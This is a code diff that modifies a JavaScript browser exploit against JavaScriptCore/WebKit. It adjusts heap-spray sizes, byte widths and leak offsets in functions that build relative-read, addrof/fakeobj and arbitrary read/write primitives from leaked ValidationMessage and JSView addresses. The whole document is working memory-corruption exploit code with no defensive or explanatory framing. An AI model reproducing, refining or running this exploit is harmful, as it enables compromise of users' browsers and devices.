@@ -68,7 +68,7 @@ function setupRW() {
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
-	let ab_addr = new Int64(str2array(g_relative_read, 7, diff + OFFSET_JSAB_VIEW_VECTOR));
+	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -115,7 +115,7 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 15; i >= 7; i--)
+	for(var i = 15; i >= 8; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
@@ -187,7 +187,7 @@ function setupRW() {
 }
 
 function read(addr, length) {
-	for (let i = 0; i < 7; i++)
+	for (let i = 0; i < 8; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
 	for (let i = 0; i < length; i++)
@@ -196,11 +196,11 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 7));
+	return new Int64(read(addr, 8));
 }
 
 function write(addr, data) {
-	for (let i = 0; i < 7; i++)
+	for (let i = 0; i < 8; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	for (let i = 0; i < data.length; i++)
 		g_ab_slave[i] = data[i];
@@ -272,14 +272,14 @@ function leakJSC() {
 	debug_log("[+] Got a relative read");
 
         var tmp_spray = {};
-        for(var i = 0; i < 200000; i++)
-                tmp_spray['Z'.repeat(8 * 3 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+        for(var i = 0; i < 100000; i++)
+                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
 	/* Spraying JSView */
 	let tmp = [];
-	for (let i = 0; i < 0x20000; i++) {
+	for (let i = 0; i < 0x10000; i++) {
 		/* The last allocated are more likely to be allocated after our relative read */
 		if (i >= 0xfc00)
 			g_arr_ab_3.push(new Uint8Array(ab));
@@ -326,12 +326,12 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
 					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
 					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
-					v = new Int64(str2array(g_relative_read, 7, i + 0x20));
+					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
 				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x13) === 0x42)
-					v = new Int64(str2array(g_relative_read, 7, i + 7));
+					v = new Int64(str2array(g_relative_read, 8, i + 8));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
 				g_jsview_leak = v;
@@ -430,10 +430,10 @@ function findTargetObj() {
 		if (!Int64.fromDouble(g_arr_ab_1[i][3]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
-			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+			if (g_round === 1) {
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
 			}
 
